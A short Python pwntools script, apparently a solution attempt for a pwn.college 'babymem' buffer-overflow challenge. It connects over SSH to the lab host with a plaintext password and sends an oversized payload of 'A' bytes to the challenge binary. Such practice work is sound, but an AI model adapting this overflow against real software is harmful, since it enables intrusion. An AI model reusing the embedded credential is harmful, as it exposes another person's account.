from pwn import *
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")

context.log_level = 'debug'
p = s.process("./babymem_level11_testing1")
# p = process('./babymem_level11_testing1')

p.sendlineafter(b'Payload size: ',b'30000')
pay = b'A'*((0x1000*5))
# pause()
p.sendafter(b'bytes)!\n',pay)
p.interactive()